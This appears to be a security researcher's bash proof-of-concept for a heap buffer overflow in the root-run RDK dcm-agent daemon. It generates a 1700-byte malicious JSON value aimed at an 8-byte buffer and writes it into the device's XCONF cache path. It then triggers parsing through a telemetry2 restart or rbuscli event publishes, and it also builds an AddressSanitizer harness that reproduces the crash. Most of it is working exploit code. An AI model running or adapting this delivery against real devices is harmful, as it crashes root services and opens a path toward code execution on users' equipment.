#!/bin/bash
###############################################################################
# PoC: DCM-003 - Unbounded strcpy() of cloud-supplied JSON string values into
#                tiny fixed heap buffers (CWE-122 Heap-Based Buffer Overflow)
#
# Target   : dcmd (RDK dcm-agent), runs as root
# File     : dcm_parseconf.c:222-224
# Sink     : strcpy(sval, pJsonItem->valuestring);   // NO length check
#
# ---------------------------------------------------------------------------
#  STRUCT LAYOUT (dcm_parseconf.h, heap-allocated via malloc in
#  dcmSettingsInit -> dcm_parseconf.c:749):
#
#      typedef struct _dcmSettingsHandle {
#          INT8  cJsonStr[2048];     /* off    0 */
#          INT8  cUploadURL[128];    /* off 2048 */
#          INT8  cUploadPrtl[8];     /* off 2176  <<< 8-BYTE TARGET <<<     */
#          INT8  cTimeZone[16];      /* off 2184 */
#          INT8  cRdkPath[80];       /* off 2200 */
#          INT8  ctBuff[1024];       /* off 2280 */
#          INT32 bRebootFlag;        /* off 3304 */
#      } DCMSettingsHandle;          /* sizeof  ~= 3308 (3312 padded)        */
#
#  dcmSettingParseConf() (dcm_parseconf.c:532) calls
#      dcmSettingJsonGetVal(h,
#          "urn:settings:LogUploadSettings:UploadRepository:uploadProtocol",
#          pUploadprtl /* = &cUploadPrtl[0] */, ...)
#  which on a string item does an unbounded
#      strcpy(&cUploadPrtl[0], pJsonItem->valuestring);
#
#  OFFSET MATH (bytes to write before reaching adjacent heap chunk):
#      end_of_struct(3308) - off(cUploadPrtl)(2176) = 1132 bytes
#      + malloc alignment padding (<= 8)            ~= 1140 bytes
#      + next-chunk size header (glibc, 8/16 bytes)  = 1148..1156 bytes
#  We send 1700 'A' bytes -> guarantees ~550 bytes spill PAST the malloc
#  chunk -> corrupts next chunk's size/fd/bk -> SIGSEGV/SIGABRT on the
#  next free()/malloc() inside the daemon (e.g. cJSON_Delete at line 651,
#  or uploadstblogs_run heap activity).
#
#  CONSTRAINT: dcmSettingJsonInit() reads the file with
#      fgets(pcJsonStr, DCM_JSON_STRSIZE /*2048*/, fpin)
#  so the WHOLE JSON object must fit on ONE line < 2047 bytes.
#  Wrapper '{"<62-char-key>":"<P>"}' = 69 bytes + len(P).
#  69 + 1700 = 1769 < 2047   -> OK.
#
# ---------------------------------------------------------------------------
#  ATTACK VECTOR (per Findings.md):
#    a) Cloud / MITM: control the XCONF DCM JSON response. telemetry2 writes
#       it verbatim to /opt/.t2persistentfolder/DCMresponse.txt then publishes
#       Device.DCM.Setconfig{dcmSetConfig=<path>} + Device.DCM.Processconfig
#       -> dcm.c:360-373 -> dcmSettingParseConf() -> strcpy overflow.
#    b) Local RBUS: any bus client that can publish those two events with an
#       attacker-controlled file path.
#
#  This script provides:
#    PART 1  - Generate the malicious single-line JSON payload.
#    PART 2  - ON-DEVICE drop: place payload at the canonical XCONF cache
#              path so the live telemetry2->dcmd cycle parses it.
#    PART 3  - OFF-DEVICE proof: compile a faithful standalone harness
#              (exact struct + exact strcpy path) with AddressSanitizer and
#              demonstrate the heap-buffer-overflow WRITE deterministically.
###############################################################################

set -u

# ---------------------------------------------------------------------------#
# Configurable knobs
# ---------------------------------------------------------------------------#
PAYLOAD_LEN=1700                     # bytes of 'A' written into cUploadPrtl[8]
EVIL_JSON=/tmp/DCM003_evil.json      # scratch copy (always written)
XCONF_CACHE=/opt/.t2persistentfolder/DCMresponse.txt   # canonical T2 path
MARKER=/tmp/PWNED_DCM-003            # success marker for off-device harness
WORKDIR=/tmp/DCM003_poc
JSON_KEY="urn:settings:LogUploadSettings:UploadRepository:uploadProtocol"

mkdir -p "${WORKDIR}"

###############################################################################
# PART 1 - Build the malicious JSON (single line, no '\n' inside)
###############################################################################
echo "[*] PART 1: generating malicious XCONF JSON ..."

# 1700 x 'A' - recognisable pattern in crash dumps (0x41414141...)
PAYLOAD=$(printf 'A%.0s' $(seq 1 ${PAYLOAD_LEN}))

# IMPORTANT: must be a SINGLE line - dcmSettingJsonInit() uses fgets().
# We deliberately include ONLY the uploadProtocol key so the very first
# dcmSettingJsonGetVal() call performs the overflow; the four later lookups
# fail harmlessly with DCM_FAILURE and take their default branches.
printf '{"%s":"%s"}' "${JSON_KEY}" "${PAYLOAD}" > "${EVIL_JSON}"

JSON_BYTES=$(wc -c < "${EVIL_JSON}")
echo "    -> wrote ${EVIL_JSON} (${JSON_BYTES} bytes, must be < 2047: OK=$([ "${JSON_BYTES}" -lt 2047 ] && echo yes || echo NO))"
echo "    -> uploadProtocol value length = ${PAYLOAD_LEN}  (target buffer = 8 bytes)"
echo "    -> overflow amount             = $((PAYLOAD_LEN - 8 + 1)) bytes past cUploadPrtl[8]"
echo "    -> bytes past end-of-struct    ~= $((PAYLOAD_LEN - 1132)) bytes into next heap chunk"

###############################################################################
# PART 2 - ON-DEVICE delivery (best-effort, non-fatal if it fails)
###############################################################################
echo
echo "[*] PART 2: on-device delivery (RDK target) ..."

# 2a. Drop into the canonical XCONF cache location. On a real device,
#     telemetry2 periodically re-publishes Device.DCM.Setconfig pointing at
#     this exact file, then Device.DCM.Processconfig - dcmd will then parse
#     OUR payload via the vulnerable code path.
if mkdir -p "$(dirname "${XCONF_CACHE}")" 2>/dev/null && \
   cp -f "${EVIL_JSON}" "${XCONF_CACHE}" 2>/dev/null ; then
    echo "    -> staged payload at ${XCONF_CACHE}"
    echo "       Trigger: wait for next T2 config cycle, or run:"
    echo "         systemctl restart telemetry2_0   # forces Setconfig/Processconfig republish"
    echo "       Observe: journalctl -u dcmd -f   (expect SIGSEGV / SIGABRT, RIP/regs full of 0x4141...)"
else
    echo "    -> (skip) cannot write ${XCONF_CACHE} on this host - not an RDK device or not root"
fi

# 2b. Optional direct RBUS trigger. dcmd subscribes to these events
#     (dcm_rbus.c:88, key = "dcmSetConfig"; dcm_rbus.c:139 sets schedJob=1).
#     On most RDK builds telemetry2 is the registered provider, so an
#     external 'rbuscli pub' may be rejected; we attempt it anyway as it
#     is harmless if it fails.
if command -v rbuscli >/dev/null 2>&1 ; then
    echo "    -> rbuscli present, attempting direct event publish (may fail if T2 owns the event):"
    # NOTE: rbuscli's simple 'pub' sends the value under key "value", but the
    # dcmd handler looks for key "dcmSetConfig" (DCM_SET_CONFIG). Some rbuscli
    # builds support named-key publish via method invoke; we try the common
    # forms and ignore errors.
    rbuscli pub Device.DCM.Setconfig string "${EVIL_JSON}"      2>/dev/null || true
    rbuscli pub Device.DCM.Processconfig string "1"             2>/dev/null || true
    echo "       (if events were accepted, dcmd will crash within ~1s of its main poll loop)"
else
    echo "    -> (skip) rbuscli not on PATH"
fi

###############################################################################
# PART 3 - OFF-DEVICE deterministic proof (standalone harness + ASAN)
#
# Reproduces the EXACT vulnerable sequence:
#   malloc(sizeof(DCMSettingsHandle))            (dcm_parseconf.c:749)
#   fgets(cJsonStr, 2048, fp)                    (dcm_parseconf.c:141)
#   cJSON_Parse(cJsonStr)                        (dcm_parseconf.c:156)
#   item = cJSON_GetObjectItem(json, KEY)        (dcm_parseconf.c:213)
#   if (cJSON_IsString(item))
#       strcpy(handle->cUploadPrtl, item->valuestring)   <<< BUG (line 224)
#   cJSON_Delete(json)                           (dcm_parseconf.c:180/651)
#   free(handle)                                 (dcm_parseconf.c:785)
#
# AddressSanitizer will halt at the strcpy with:
#   "heap-buffer-overflow ... WRITE of size 1701 ... allocated by ... 3308-byte region"
###############################################################################
echo
echo "[*] PART 3: off-device standalone reproduction harness ..."

cat > "${WORKDIR}/dcm003_harness.c" <<'CEOF'
/* Faithful reproduction of dcm_parseconf.c:117-236 + 749 for DCM-003.
 * Build with cJSON if available, otherwise fall back to a minimal inline
 * string extractor so the PoC has zero hard dependencies. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define DCM_JSON_STRSIZE          2048   /* dcm_parseconf.h:29              */
#define MAX_URL_SIZE              128    /* dcm_utils.h:69                  */
#define MAX_DEVICE_PROP_BUFF_SIZE 80     /* dcm_utils.h:67                  */
#define EXECMD_BUFF_SIZE          1024   /* dcm_utils.h:68                  */

/* EXACT copy of the victim struct - dcm_parseconf.h:51-60 */
typedef struct _dcmSettingsHandle {
    char  cJsonStr[DCM_JSON_STRSIZE];
    char  cUploadURL[MAX_URL_SIZE];
    char  cUploadPrtl[8];                /* <<< 8-byte strcpy target <<< */
    char  cTimeZone[16];
    char  cRdkPath[MAX_DEVICE_PROP_BUFF_SIZE];
    char  ctBuff[EXECMD_BUFF_SIZE];
    int   bRebootFlag;
} DCMSettingsHandle;

#ifdef HAVE_CJSON
#include <cjson/cJSON.h>
#else
/* ---- minimal fallback: extract first JSON string value for a key ---- */
static char gValBuf[4096];
static const char *mini_json_get_string(const char *json, const char *key) {
    char needle[256];
    snprintf(needle, sizeof(needle), "\"%s\":\"", key);
    const char *p = strstr(json, needle);
    if (!p) return NULL;
    p += strlen(needle);
    size_t i = 0;
    while (*p && *p != '"' && i < sizeof(gValBuf) - 1) gValBuf[i++] = *p++;
    gValBuf[i] = 0;
    return gValBuf;
}
#endif

int main(int argc, char **argv)
{
    if (argc < 2) { fprintf(stderr, "usage: %s <evil.json>\n", argv[0]); return 1; }

    fprintf(stderr, "[harness] sizeof(DCMSettingsHandle)      = %zu\n", sizeof(DCMSettingsHandle));
    fprintf(stderr, "[harness] offsetof(cUploadPrtl)          = %zu\n",
            (size_t)((char *)&((DCMSettingsHandle *)0)->cUploadPrtl - (char *)0));
    fprintf(stderr, "[harness] bytes from cUploadPrtl to end  = %zu\n",
            sizeof(DCMSettingsHandle) -
            (size_t)((char *)&((DCMSettingsHandle *)0)->cUploadPrtl - (char *)0));

    /* === replicate dcmSettingsInit(): heap-allocate the handle ========= */
    DCMSettingsHandle *h = malloc(sizeof(DCMSettingsHandle));
    if (!h) return 1;
    memset(h, 0, sizeof(*h));

    /* Allocate a sentinel chunk AFTER the handle so plain (non-ASAN)
     * builds also crash reliably when its header/contents are smashed. */
    char *sentinel = malloc(64);
    if (sentinel) strcpy(sentinel, "SENTINEL_OK");

    /* === replicate dcmSettingJsonInit(): single-line fgets ============= */
    FILE *fp = fopen(argv[1], "r");
    if (!fp) { perror("fopen"); return 1; }
    if (!fgets(h->cJsonStr, DCM_JSON_STRSIZE, fp)) { fclose(fp); return 1; }
    fclose(fp);

    /* === replicate dcmSettingJsonGetVal() for uploadProtocol =========== */
    const char *KEY =
        "urn:settings:LogUploadSettings:UploadRepository:uploadProtocol";
    const char *valuestring = NULL;

#ifdef HAVE_CJSON
    cJSON *root = cJSON_Parse(h->cJsonStr);
    if (!root) { fprintf(stderr, "cJSON_Parse failed\n"); return 1; }
    cJSON *item = cJSON_GetObjectItem(root, KEY);
    if (item && cJSON_IsString(item)) valuestring = item->valuestring;
#else
    valuestring = mini_json_get_string(h->cJsonStr, KEY);
#endif

    if (!valuestring) { fprintf(stderr, "key not found\n"); return 1; }
    fprintf(stderr, "[harness] valuestring length             = %zu  (dest cap = 8)\n",
            strlen(valuestring));
    fprintf(stderr, "[harness] >>> calling strcpy(cUploadPrtl[8], valuestring) -- VULNERABLE LINE dcm_parseconf.c:224 <<<\n");

    /* ******************** THE BUG - dcm_parseconf.c:224 *************** */
    strcpy(h->cUploadPrtl, valuestring);
    /* ****************************************************************** */

    fprintf(stderr, "[harness] strcpy returned without ASAN trap (non-instrumented build).\n");
    fprintf(stderr, "[harness] cTimeZone  (off+8)   now = %.16s...\n", h->cTimeZone);
    fprintf(stderr, "[harness] cRdkPath   (off+24)  now = %.16s...\n", h->cRdkPath);
    fprintf(stderr, "[harness] bRebootFlag(off+1128) now = 0x%08x\n", (unsigned)h->bRebootFlag);
    if (sentinel)
        fprintf(stderr, "[harness] adjacent heap sentinel now = %.16s  (expected 'SENTINEL_OK')\n", sentinel);

#ifdef HAVE_CJSON
    cJSON_Delete(root);   /* heap activity on a corrupted arena */
#endif

    /* === replicate dcmSettingsUnInit(): free the smashed chunk ========= */
    fprintf(stderr, "[harness] free(handle) on corrupted heap ... expect glibc abort or ASAN report\n");
    free(sentinel);   /* metadata of this chunk was overwritten by 0x41 */
    free(h);

    /* If we somehow survived (unusual allocator), still flag success:
     * adjacent fields containing 0x41 proves the out-of-bounds write. */
    if (h->cRdkPath[0] == 'A') {
        FILE *m = fopen("/tmp/PWNED_DCM-003", "w");
        if (m) { fprintf(m, "DCM-003 heap overflow confirmed: cRdkPath corrupted by uploadProtocol strcpy\n"); fclose(m); }
        fprintf(stderr, "[harness] EXPLOIT REACHED - wrote /tmp/PWNED_DCM-003\n");
    }
    return 0;
}
CEOF

# --- Try to compile, preferring AddressSanitizer + real cJSON ----------------
CC=${CC:-gcc}
HARNESS_BIN="${WORKDIR}/dcm003_harness"
CJSON_FLAGS=""
if echo '#include <cjson/cJSON.h>' | ${CC} -E -x c - >/dev/null 2>&1 ; then
    CJSON_FLAGS="-DHAVE_CJSON -lcjson"
    echo "    -> system cJSON found, using real parser (matches daemon)"
else
    echo "    -> system cJSON not found, using built-in minimal parser"
fi

BUILT=0
if ${CC} -g -O0 -fsanitize=address -fno-omit-frame-pointer \
        -o "${HARNESS_BIN}" "${WORKDIR}/dcm003_harness.c" ${CJSON_FLAGS} 2>/dev/null ; then
    echo "    -> built WITH AddressSanitizer"
    BUILT=1
elif ${CC} -g -O0 -o "${HARNESS_BIN}" "${WORKDIR}/dcm003_harness.c" ${CJSON_FLAGS} 2>/dev/null ; then
    echo "    -> built WITHOUT AddressSanitizer (will rely on glibc heap checks / sentinel)"
    BUILT=1
else
    echo "    -> (skip) no working C compiler on this host - use PART 2 on a real device"
fi

if [ "${BUILT}" -eq 1 ]; then
    echo
    echo "    ---------------------------------------------------------------"
    echo "    Running harness against ${EVIL_JSON}"
    echo "    EXPECTED (ASAN): 'heap-buffer-overflow ... WRITE of size $((PAYLOAD_LEN+1))'"
    echo "                     '... is located 0 bytes after ~3308-byte region'"
    echo "    EXPECTED (glibc): 'free(): invalid next size' / 'malloc(): corrupted'"
    echo "                      / SIGSEGV with 0x4141414141414141 in registers"
    echo "    ---------------------------------------------------------------"
    rm -f "${MARKER}"
    "${HARNESS_BIN}" "${EVIL_JSON}"
    RC=$?
    echo "    ---------------------------------------------------------------"
    echo "    -> harness exit code = ${RC}"
    if [ ${RC} -ne 0 ]; then
        echo "    -> NON-ZERO EXIT (crash / sanitizer abort)  ==> DCM-003 CONFIRMED"
        : > "${MARKER}"
    fi
    [ -f "${MARKER}" ] && echo "    -> marker file present: ${MARKER}  ==> DCM-003 CONFIRMED"
fi

echo
echo "[*] Done. Artifacts:"
echo "      malicious JSON  : ${EVIL_JSON}"
echo "      on-device drop  : ${XCONF_CACHE}"
echo "      harness src/bin : ${WORKDIR}/"
echo "      success marker  : ${MARKER}"
exit 0

